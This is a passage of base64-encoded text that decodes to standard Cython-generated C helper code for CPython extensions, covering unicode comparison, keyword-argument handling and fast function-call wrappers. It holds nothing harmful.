PTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGlmICh1bmxpa2VseShsZW5ndGgyIDwgMCkpIHJldHVybiAtMTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmIChsZW5ndGggIT0gbGVuZ3RoMikge1xuICAgICAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgICAgIH1cbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICAgICAgIHtcbiAgICAgICAgICAgIFB5X2hhc2hfdCBoYXNoMSwgaGFzaDI7XG4gICAgICAgICAgICBoYXNoMSA9ICgoUHlBU0NJSU9iamVjdCopczEpLT5oYXNoO1xuICAgICAgICAgICAgaGFzaDIgPSAoKFB5QVNDSUlPYmplY3QqKXMyKS0+aGFzaDtcbiAgICAgICAgICAgIGlmIChoYXNoMSAhPSBoYXNoMiAmJiBoYXNoMSAhPSAtMSAmJiBoYXNoMiAhPSAtMSkge1xuICAgICAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAga2luZCA9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHMxKTtcbiAgICAgICAgaWYgKGtpbmQgIT0gX19QeXhfUHlVbmljb2RlX0tJTkQoczIpKSB7XG4gICAgICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICAgICAgfVxuICAgICAgICBkYXRhMSA9IF9fUHl4X1B5VW5pY29kZV9EQVRBKHMxKTtcbiAgICAgICAgZGF0YTIgPSBfX1B5eF9QeVVuaWNvZGVfREFUQShzMik7XG4gICAgICAgIGlmIChfX1B5eF9QeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhMSwgMCkgIT0gX19QeXhfUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YTIsIDApKSB7XG4gICAgICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICAgICAgfSBlbHNlIGlmIChsZW5ndGggPT0gMSkge1xuICAgICAgICAgICAgZ290byByZXR1cm5fZXE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gbWVtY21wKGRhdGExLCBkYXRhMiwgKHNpemVfdCkobGVuZ3RoICoga2luZCkpO1xuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpID8gKHJlc3VsdCA9PSAwKSA6IChyZXN1bHQgIT0gMCk7XG4gICAgICAgIH1cbiAgICB9IGVsc2UgaWYgKChzMSA9PSBQeV9Ob25lKSAmIHMyX2lzX3VuaWNvZGUpIHtcbiAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgfSBlbHNlIGlmICgoczIgPT0gUHlfTm9uZSkgJiBzMV9pc191bmljb2RlKSB7XG4gICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGludCByZXN1bHQ7XG4gICAgICAgIFB5T2JqZWN0KiBweV9yZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShzMSwgczIsIGVxdWFscyk7XG4gICAgICAgIGlmICghcHlfcmVzdWx0KVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfcmVzdWx0KTtcbiAgICAgICAgUHlfREVDUkVGKHB5X3Jlc3VsdCk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxucmV0dXJuX2VxOlxuICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKTtcbnJldHVybl9uZTpcbiAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4jZW5kaWZcbn1cblxuXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpXG57XG4gICAgUHlfc3NpemVfdCBpLCBuID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKTtcbiAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgaWYgKHVubGlrZWx5KG4gPT0gLTEpKSByZXR1cm4gTlVMTDtcbiAgICAjZW5kaWZcbiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKVxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKm5hbWVpID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIGlmICh1bmxpa2VseSghbmFtZWkpKSByZXR1cm4gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmIChzID09IG5hbWVpKSByZXR1cm4ga3d2YWx1ZXNbaV07XG4gICAgfVxuICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspXG4gICAge1xuICAgICAgICBQeU9iamVjdCAqbmFtZWkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3bmFtZXMsIGkpO1xuICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgaWYgKHVubGlrZWx5KCFuYW1laSkpIHJldHVybiBOVUxMO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgaW50IGVxID0gX19QeXhfUHlVbmljb2RlX0VxdWFscyhzLCBuYW1laSwgUHlfRVEpO1xuICAgICAgICBpZiAodW5saWtlbHkoZXEgIT0gMCkpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShlcSA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgICAgIHJldHVybiBrd3ZhbHVlc1tpXTtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gTlVMTDtcbn1cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBQeU9iamVjdCAqX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzKSB7XG4gICAgUHlfc3NpemVfdCBpLCBua3dhcmdzO1xuICAgIFB5T2JqZWN0ICpkaWN0O1xuI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIG5rd2FyZ3MgPSBQeVR1cGxlX1NpemUoa3duYW1lcyk7XG4gICAgaWYgKHVubGlrZWx5KG5rd2FyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIG5rd2FyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKGt3bmFtZXMpO1xuI2VuZGlmXG4gICAgZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICBpZiAodW5saWtlbHkoIWRpY3QpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBmb3IgKGk9MDsgaTxua3dhcmdzOyBpKyspIHtcbiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICBQeU9iamVjdCAqa2V5ID0gUHlUdXBsZV9HZXRJdGVtKGt3bmFtZXMsIGkpO1xuICAgICAgICBpZiAoIWtleSkgZ290byBiYWQ7XG4jZWxzZVxuICAgICAgICBQeU9iamVjdCAqa2V5ID0gUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTtcbiNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0oZGljdCwga2V5LCBrd3ZhbHVlc1tpXSkgPCAwKSlcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICByZXR1cm4gZGljdDtcbmJhZDpcbiAgICBQeV9ERUNSRUYoZGljdCk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG4jZW5kaWZcbiNlbmRpZlxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihcbiAgICBjb25zdCBjaGFyKiBmdW5jX25hbWUsXG4gICAgUHlPYmplY3QqIGt3X25hbWUpXG57XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiVzKCkgZ290IG11bHRpcGxlIHZhbHVlcyBmb3Iga2V5d29yZCBhcmd1bWVudCBcJyVVXCciLCBmdW5jX25hbWUsIGt3X25hbWUpO1xufVxuXG5cbiNpZiBDWVRIT05fRkFTVF9QWUNBTEwgJiYgIUNZVEhPTl9WRUNUT1JDQUxMXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KFB5Q29kZU9iamVjdCAqY28sIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmdsb2JhbHMpIHtcbiAgICBQeUZyYW1lT2JqZWN0ICpmO1xuICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDtcbiAgICBQeU9iamVjdCAqKmZhc3Rsb2NhbHM7XG4gICAgUHlfc3NpemVfdCBpO1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgYXNzZXJ0KGdsb2JhbHMgIT0gTlVMTCk7XG4gICAgXG4gICAgYXNzZXJ0KHRzdGF0ZSAhPSBOVUxMKTtcbiAgICBmID0gUHlGcmFtZV9OZXcodHN0YXRlLCBjbywgZ2xvYmFscywgTlVMTCk7XG4gICAgaWYgKGYgPT0gTlVMTCkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgZmFzdGxvY2FscyA9IF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmKTtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbmE7IGkrKykge1xuICAgICAgICBQeV9JTkNSRUYoKmFyZ3MpO1xuICAgICAgICBmYXN0bG9jYWxzW2ldID0gKmFyZ3MrKztcbiAgICB9XG4gICAgcmVzdWx0ID0gUHlFdmFsX0V2YWxGcmFtZUV4KGYsMCk7XG4gICAgKyt0c3RhdGUtPnJlY3Vyc2lvbl9kZXB0aDtcbiAgICBQeV9ERUNSRUYoZik7XG4gICAgLS10c3RhdGUtPnJlY3Vyc2lvbl9kZXB0aDtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7XG4gICAgUHlDb2RlT2JqZWN0ICpjbyA9IChQeUNvZGVPYmplY3QgKilQeUZ1bmN0aW9uX0dFVF9DT0RFKGZ1bmMpO1xuICAgIFB5T2JqZWN0ICpnbG9iYWxzID0gUHlGdW5jdGlvbl9HRVRfR0xPQkFMUyhmdW5jKTtcbiAgICBQeU9iamVjdCAqYXJnZGVmcyA9IFB5RnVuY3Rpb25fR0VUX0RFRkFVTFRTKGZ1bmMpO1xuICAgIFB5T2JqZWN0ICpjbG9zdXJlO1xuICAgIFB5T2JqZWN0ICprd2RlZnM7XG4gICAgUHlPYmplY3QgKmt3dHVwbGUsICoqaztcbiAgICBQeU9iamVjdCAqKmQ7XG4gICAgUHlfc3NpemVfdCBuZDtcbiAgICBQeV9zc2l6ZV90IG5rO1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgYXNzZXJ0KGt3YXJncyA9PSBOVUxMIHx8IFB5RGljdF9DaGVjayhrd2FyZ3MpKTtcbiAgICBuayA9IGt3YXJncyA/IFB5RGljdF9TaXplKGt3YXJncykgOiAwO1xuICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgaWYgKFxuICAgICAgICAgICAgY28tPmNvX2t3b25seWFyZ2NvdW50ID09IDAgJiZcbiAgICAgICAgICAgIGxpa2VseShrd2FyZ3MgPT0gTlVMTCB8fCBuayA9PSAwKSAmJlxuICAgICAgICAgICAgY28tPmNvX2ZsYWdzID09IChDT19PUFRJTUlaRUQgfCBDT19ORVdMT0NBTFMgfCBDT19OT0ZSRUUpKSB7XG4gICAgICAgIGlmIChhcmdkZWZzID09IE5VTEwgJiYgY28tPmNvX2FyZ2NvdW50ID09IG5hcmdzKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsTm9LdyhjbywgYXJncywgbmFyZ3MsIGdsb2JhbHMpO1xuICAgICAgICAgICAgZ290byBkb25lO1xuICAgICAgICB9XG4gICAgICAgIGVsc2UgaWYgKG5hcmdzID09IDAgJiYgYXJnZGVmcyAhPSBOVUxMXG4gICAgICAgICAgICAgICAgICYmIGNvLT5jb19hcmdjb3VudCA9PSBQeV9TSVpFKGFyZ2RlZnMpKSB7XG4gICAgICAgICAgICBcbiAgICAgICAgICAgIGFyZ3MgPSAmUHlUdXBsZV9HRVRfSVRFTShhcmdkZWZzLCAwKTtcbiAgICAgICAgICAgIHJlc3VsdCA9X19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbE5vS3coY28sIGFyZ3MsIFB5X1NJWkUoYXJnZGVmcyksIGdsb2JhbHMpO1xuICAgICAgICAgICAgZ290byBkb25lO1xuICAgICAgICB9XG4gICAgfVxuICAgIGlmIChrd2FyZ3MgIT0gTlVMTCkge1xuICAgICAgICBQeV9zc2l6ZV90IHBvcywgaTtcbiAgICAgICAga3d0dXBsZSA9IFB5VHVwbGVfTmV3KDIgKiBuayk7XG4gICAgICAgIGlmIChrd3R1cGxlID09IE5VTEwpIHtcbiAgICAgICAgICAgIHJlc3VsdCA9IE5VTEw7XG4gICAgICAgICAgICBnb3RvIGRvbmU7XG4gICAgICAgIH1cbiAgICAgICAgayA9ICZQeVR1cGxlX0dFVF9JVEVNKGt3dHVwbGUsIDApO1xuICAgICAgICBwb3MgPSBpID0gMDtcbiAgICAgICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3YXJncywgJnBvcywgJmtbaV0sICZrW2krMV0pKSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYoa1tpXSk7XG4gICAgICAgICAgICBQeV9JTkNSRUYoa1tpKzFdKTtcbiAgICAgICAgICAgIGkgKz0gMjtcbiAgICAgICAgfVxuICAgICAgICBuayA9IGkgLyAyO1xuICAgIH1cbiAgICBlbHNlIHtcbiAgICAgICAga3d0dXBsZSA9IE5VTEw7XG4gICAgICAgIGsgPSBOVUxMO1xuICAgIH1cbiAgICBjbG9zdXJlID0gUHlGdW5jdGlvbl9HRVRfQ0xPU1VSRShmdW5jKTtcbiAgICBrd2RlZnMgPSBQeUZ1bmN0aW9uX0dFVF9LV19ERUZBVUxUUyhmdW5jKTtcbiAgICBpZiAoYXJnZGVmcyAhPSBOVUxMKSB7XG4gICAgICAgIGQgPSAmUHlUdXBsZV9HRVRfSVRFTShhcmdkZWZzLCAwKTtcbiAgICAgICAgbmQgPSBQeV9TSVpFKGFyZ2RlZnMpO1xuICAgIH1cbiAgICBlbHNlIHtcbiAgICAgICAgZCA9IE5VTEw7XG4gICAgICAgIG5kID0gMDtcbiAgICB9XG4gICAgcmVzdWx0ID0gUHlFdmFsX0V2YWxDb2RlRXgoKFB5T2JqZWN0KiljbywgZ2xvYmFscywgKFB5T2JqZWN0ICopTlVMTCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmdzLCAoaW50KW5hcmdzLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGssIChpbnQpbmssXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCwgKGludCluZCwga3dkZWZzLCBjbG9zdXJlKTtcbiAgICBQeV9YREVDUkVGKGt3dHVwbGUpO1xuZG9uZTpcbiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgdGVybmFyeWZ1bmMgY2FsbCA9IFB5X1RZUEUoZnVuYyktPnRwX2NhbGw7XG4gICAgaWYgKHVubGlrZWx5KCFjYWxsKSlcbiAgICAgICAgcmV0dXJuIFB5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdyk7XG4gICAgaWYgKHVubGlrZWx5KFB5X0VudGVyUmVjdXJzaXZlQ2FsbCgiIHdoaWxlIGNhbGxpbmcgYSBQeXRob24gb2JqZWN0IikpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICByZXN1bHQgPSAoKmNhbGwpKGZ1bmMsIGFyZywga3cpO1xuICAgIFB5X0xlYXZlUmVjdXJzaXZlQ2FsbCgpO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiB1bmxpa2VseSghUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFxuICAgICAgICAgICAgUHlFeGNfU3lzdGVtRXJyb3IsXG4gICAgICAgICAgICAiTlVMTCByZXN1bHQgd2l0aG91dCBlcnJvciBpbiBQeU9iamVjdF9DYWxsIik7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKSB7XG4gICAgUHlPYmplY3QgKnNlbGYsICpyZXN1bHQ7XG4gICAgUHlDRnVuY3Rpb24gY2Z1bmM7XG4gICAgY2Z1bmMgPSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpO1xuICAgIHNlbGYgPSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX1NFTEYoZnVuYyk7XG4gICAgaWYgKHVubGlrZWx5KFB5X0VudGVyUmVjdXJzaXZlQ2FsbCgiIHdoaWxlIGNhbGxpbmcgYSBQeXRob24gb2JqZWN0IikpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICByZXN1bHQgPSBjZnVuYyhzZWxmLCBhcmcpO1xuICAgIFB5X0xlYXZlUmVjdXJzaXZlQ2FsbCgpO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiB1bmxpa2VseSghUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFxuICAgICAgICAgICAgUHlFeGNfU3lzdGVtRXJyb3IsXG4gICAgICAgICAgICAiTlVMTCByZXN1bHQgd2l0aG91dCBlcnJvciBpbiBQeU9iamVjdF9DYWxsIik7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcblxuXG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRmFzdENhbGxfZmFsbGJhY2soUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICogY29uc3QqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7XG4gICAgUHlPYmplY3QgKmFyZ3N0dXBsZTtcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gMDtcbiAgICBzaXplX3QgaTtcbiAgICBhcmdzdHVwbGUgPSBQeVR1cGxlX05ldygoUHlfc3NpemVfdCluYXJncyk7XG4gICAgaWYgKHVubGlrZWx5KCFhcmdzdHVwbGUpKSByZXR1cm4gTlVMTDtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbmFyZ3M7IGkrKykge1xuICAgICAgICBQeV9JTkNSRUYoYXJnc1tpXSk7XG4gICAgICAgIGlmIChfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKGFyZ3N0dXBsZSwgKFB5X3NzaXplX3QpaSwgYXJnc1tpXSkgIT0gKDApKSBnb3RvIGJhZDtcbiAgICB9XG4gICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBhcmdzdHVwbGUsIGt3YXJncyk7XG4gIGJhZDpcbiAgICBQeV9ERUNSRUYoYXJnc3R1cGxlKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKSBfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKVxuICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZlY3RvcmNhbGxmdW5jIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihQeU9iamVjdCAqY2FsbGFibGUpIHtcbiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShjYWxsYWJsZSk7XG4gICAgI2lmIGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKVxuICAgIGlmIChfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrRXhhY3QoY2FsbGFibGUpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChjYWxsYWJsZSk7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIGlmICghUHlUeXBlX0hhc0ZlYXR1cmUodHAsIFB5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgYXNzZXJ0KFB5Q2FsbGFibGVfQ2hlY2soY2FsbGFibGUpKTtcbiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IHRwLT50cF92ZWN0b3JjYWxsX29mZnNldDtcbiAgICBhc3NlcnQob2Zmc2V0ID4gMCk7XG4gICAgdmVjdG9yY2FsbGZ1bmMgcHRyO1xuICAgIG1lbWNweSgmcHRyLCAoY2hhciAqKSBjYWxsYWJsZSArIG9mZnNldCwgc2l6ZW9mKHB0cikpO1xuICAgIHJldHVybiBwdHI7XG59XG4gICNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oY2FsbGFibGUpIFB5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSlcbiAgI2VuZGlmXG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IF9uYXJncywgUHlPYmplY3QgKmt3YXJncykge1xuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBfX1B5eF9QeVZlY3RvcmNhbGxfTkFSR1MoX25hcmdzKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICBpZiAobmFyZ3MgPT0gMCAmJiBrd2FyZ3MgPT0gTlVMTCkge1xuICAgICAgICBpZiAoX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIGxpa2VseSggX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAmIE1FVEhfTk9BUkdTKSlcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oZnVuYywgTlVMTCk7XG4gICAgfVxuICAgIGVsc2UgaWYgKG5hcmdzID09IDEgJiYga3dhcmdzID09IE5VTEwpIHtcbiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX08pKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRoTyhmdW5jLCBhcmdzWzBdKTtcbiAgICB9XG4jZW5kaWZcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMEIxXG4gICAgI2lmIENZVEhPTl9GQVNUX1BZQ0NBTExcbiAgICBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHtcbiAgICAgICAgaWYgKGt3YXJncykge1xuICAgICAgICAgICAgcmV0dXJuIF9QeUNGdW5jdGlvbl9GYXN0Q2FsbERpY3QoZnVuYywgYXJncywgbmFyZ3MsIGt3YXJncyk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gX1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsS2V5d29yZHMoZnVuYywgYXJncywgbmFyZ3MsIE5VTEwpO1xuICAgICAgICB9XG4gICAgfVxuICAgIGlmICgha3dhcmdzICYmIF9fUHl4X0lTX1RZUEUoZnVuYywgJlB5TWV0aG9kRGVzY3JfVHlwZSkpIHtcbiAgICAgICAgcmV0dXJuIF9QeU1ldGhvZERlc2NyX0Zhc3RDYWxsS2V5d29yZHMoZnVuYywgYXJncywgbmFyZ3MsIE5VTEwpO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICAjaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMXG4gICAgaWYgKFB5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KGZ1bmMsIGFyZ3MsIG5hcmdzLCBrd2FyZ3MpO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICAjZW5kaWZcbiAgICBpZiAoa3dhcmdzID09IE5VTEwpIHtcbiAgICAgICAgI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIHZlY3RvcmNhbGxmdW5jIGYgPSBfX1B5eF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oZnVuYyk7XG4gICAgICAgIGlmIChmKSB7XG4gICAgICAgICAgICByZXR1cm4gZihmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpO1xuICAgICAgICB9XG4gICAgICAgICNlbGlmIGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKSAmJiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICAgICAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpKSB7XG4gICAgICAgICAgICBfX3B5eF92ZWN0b3JjYWxsZnVuYyBmID0gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoZnVuYyk7XG4gICAgICAgICAgICBpZiAoZikgcmV0dXJuIGYoZnVuYywgYXJncywgX25hcmdzLCBOVUxMKTtcbiAgICAgICAgfVxuICAgICAgICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIENZVEhPTl9WRUNUT1JDQUxMXG4gICAgICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiAgICBpZiAobmFyZ3MgPT0gMCkge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwga3dhcmdzKTtcbiAgICB9XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbERpY3QoZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTtcbiAgICAjZWxzZVxuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN